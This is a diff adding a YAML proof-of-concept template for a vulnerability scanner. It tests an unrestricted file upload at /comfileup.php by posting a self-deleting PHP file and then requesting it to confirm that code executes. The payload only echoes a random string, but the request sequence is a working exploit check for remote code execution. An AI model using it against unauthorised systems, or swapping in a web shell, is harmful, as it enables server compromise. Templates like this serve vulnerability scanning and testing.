@@ -1,0 +1,40 @@
+name: poc-yaml-test
+manual: true
+transport: http
+set:
+  s1: randomLowercase(20)
+  s2: randomLowercase(20)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /comfileup.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{s1}}.php\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <?php echo \"{{s2}}\"; unlink(__FILE__); ?>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(s1)
+    output:
+      search: '"/uploads(?P<tmp1>.+?).php".bsubmatch(response.body)'
+      tmp1: replaceAll(search["tmp1"],'\\','')
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /uploads{{tmp1}}.php
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(s2)
+expression: r0() && r1()
+detail:
+  author: k3ppf0r
+  links:
+    - https://blog.csdn.net/qq_41904294/article/details/140689981?spm=1001.2014.3001.5502
